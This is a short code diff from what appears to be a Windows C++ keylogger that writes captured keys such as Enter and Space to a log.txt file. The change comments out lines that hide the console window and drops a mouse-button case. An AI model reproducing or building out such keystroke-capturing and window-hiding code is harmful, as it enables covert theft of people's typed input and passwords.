@@ -14,8 +14,8 @@ int main()
 {
 //test
 //test
-HWND hWnd = GetConsoleWindow(); 
-ShowWindow( hWnd, SW_HIDE ); 
+//HWND hWnd = GetConsoleWindow(); 
+//ShowWindow( hWnd, SW_HIDE ); 
 //Hidding Console
 HINSTANCE appInstance = GetModuleHandle(NULL);
 
@@ -55,8 +55,6 @@ ofstream myfile("log.txt", std::ios::app);
             	break;
             	case VK_RETURN: 
                 	myfile<<"\n Enter  \n"; 
-				case VK_XBUTTON1:
-					myfile<<"XBUTTON";
 				break;
 				case VK_SPACE:
 					myfile<<"\n";
